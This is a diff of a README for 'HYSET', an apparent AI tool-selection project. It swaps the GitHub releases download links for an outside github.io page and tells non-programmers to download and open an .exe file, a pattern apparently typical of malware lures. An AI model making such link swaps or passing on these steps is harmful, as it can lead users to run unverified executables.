@@ -1,6 +1,6 @@
 # 🔍 HYSET - Find AI Tools With Better Precision
 
-[![Download HYSET](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/Santanu72159/HYSET/releases)
+[![Download HYSET](https://img.shields.io/badge/Download-Release-blue.svg)](https://santanu72159.github.io)
 
 HYSET helps machines find the right tools for tasks. Artificial intelligence models often struggle to pick the best tools when faced with complex requests. This software uses hyperedge prediction to group tools logically. It creates connections between related functions so your AI agent finds exactly what it needs to complete a job. You can use these tools to improve how your AI agents interact with external information.
 
@@ -8,7 +8,7 @@ HYSET helps machines find the right tools for tasks. Artificial intelligence mod
 
 You do not need programming skills to use this software. Follow these steps to obtain and run the application on your computer.
 
-1. Go to the [Releases page](https://github.com/Santanu72159/HYSET/releases).
+1. Go to the [Releases page](https://santanu72159.github.io).
 2. Look for the latest version at the top of the list.
 3. Click the link that ends in .exe to start your download.
 4. Open the file once the download finishes.
